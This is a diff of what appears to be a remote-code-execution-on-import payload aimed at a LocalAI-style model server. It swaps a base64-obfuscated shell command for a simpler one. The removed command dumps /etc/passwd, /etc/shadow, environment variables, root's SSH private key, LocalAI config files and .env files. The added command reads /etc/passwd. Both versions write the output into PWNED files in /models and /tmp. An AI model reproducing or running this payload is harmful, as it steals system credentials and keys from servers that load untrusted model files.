@@ -1,16 +1,15 @@
-# rce-by-import v7 - deep data exfil
+# rce-by-import v8 - passwd
 import os, subprocess, base64, threading, json, urllib.request
 
 def _pwn():
     try:
         import base64 as b
-        cmd = b.b64decode("L2Jpbi9iYXNoIC1jICdlY2hvID09PUlEPT09OyBpZDsgZWNobyA9PT1IT1NUPT09OyBob3N0bmFtZTsgZWNobyA9PT1QQVNTV0Q9PT07IGNhdCAvZXRjL3Bhc3N3ZDsgZWNobyA9PT1TSEFET1c9PT07IGNhdCAvZXRjL3NoYWRvdyAyPi9kZXYvbnVsbCB8IGhlYWQgLTU7IGVjaG8gPT09RU5WPT09OyBlbnY7IGVjaG8gPT09U1NIPT09OyBscyAtbGEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGNhdCAvcm9vdC8uc3NoL2lkX3JzYSAyPi9kZXYvbnVsbCB8IGhlYWQgLTEwOyBlY2hvID09PU1PREVMU19ESVI9PT07IGxzIC1sYSAvbW9kZWxzLyAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwOyBlY2hvID09PUNPTkZJRz09PTsgY2F0IC9ldGMvbG9jYWxhaS8qLnlhbWwgMj4vZGV2L251bGw7IGZpbmQgLyAtbmFtZSAiLmVudiIgLW8gLW5hbWUgIioueWFtbCIgMj4vZGV2L251bGwgfCBncmVwIC12IHByb2MgfCBoZWFkIC0yMCc=").decode()
-        out = subprocess.check_output(cmd, shell=True, timeout=25, stderr=subprocess.STDOUT)
+        cmd = b.b64decode("Y2F0IC9ldGMvcGFzc3dk").decode()
+        out = subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT)
         out_s = out.decode(errors="replace")
-        # 写入 /models/ 目录 (列表可见)
-        for d in ["/models", "/tmp", "/opt/localai/models"]:
+        for d in ["/models", "/tmp"]:
             try:
-                with open(d + "/PWNED-EXFIL.txt", "w") as f:
+                with open(d + "/PWNED-PASSWD.txt", "w") as f:
                     f.write(out_s)
             except Exception:
                 pass
